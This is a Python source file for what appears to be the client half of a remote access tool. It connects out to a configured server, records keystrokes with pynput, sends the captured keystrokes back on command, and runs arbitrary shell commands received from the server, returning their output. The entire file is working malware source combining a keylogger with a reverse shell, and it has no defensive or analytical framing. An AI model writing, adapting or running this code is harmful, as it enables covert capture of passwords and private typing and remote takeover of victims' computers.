import socket
import subprocess
import os
from pynput import keyboard

SERVER_IP = '255.255.255.255'  
SERVER_PORT = 54321 #any port works, just make sure it matches the other file

keylog_data = []
keylogger_active = False

def on_press(key):
    global keylog_data
    try:
        keylog_data.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            keylog_data.append(' ')
        elif key == keyboard.Key.enter:
            keylog_data.append('\n')
        else:
            keylog_data.append(f'[{key}]')

def start_keylogger():
    global keylogger_active
    if not keylogger_active:
        keylogger_active = True
        listener = keyboard.Listener(on_press=on_press)
        listener.start()

def stop_keylogger():
    global keylogger_active
    keylogger_active = False

def get_keylogs():
    global keylog_data
    logs = ''.join(keylog_data)
    keylog_data = [] #set as an array for simplicity
    return logs

def connect_to_server():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_IP, SERVER_PORT))

    while True:
        command = client.recv(1024).decode('utf-8')

        if command.lower() == "exit":
            break
        elif command.strip() == "start_keylogger":
            start_keylogger()
            client.send("Keylogger started.\n".encode('utf-8'))
        elif command.strip() == "stop_keylogger":
            stop_keylogger()
            client.send("Keylogger stopped.\n".encode('utf-8'))
        elif command.strip() == "get_keylogs":
            logs = get_keylogs()
            client.send(f"Captured Keystrokes:\n{logs}\n".encode('utf-8'))
        elif command.startswith("cd "):
            try:
                directory = command.strip().split(" ", 1)[1]
                os.chdir(directory)
                client.send(f"Changed directory to {os.getcwd()}\n".encode('utf-8'))
            except Exception as e:
                client.send(f"Failed to change directory: {e}\n".encode('utf-8'))
        elif command.startswith("launch "):
            app_name = command[7:].strip()
            try:
                subprocess.Popen([app_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                client.send(f"Launched application: {app_name}\n".encode('utf-8'))
            except Exception as e:
                client.send(f"Failed to launch application {app_name}: {e}\n".encode('utf-8'))
        else:
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                client.sendall(output.encode('utf-8'))
            except subprocess.CalledProcessError as e:
                client.sendall(e.output.encode('utf-8'))
            except Exception as e:
                client.send(f"Command execution failed: {e}\n".encode('utf-8'))

    client.close()

if __name__ == "__main__":
    connect_to_server()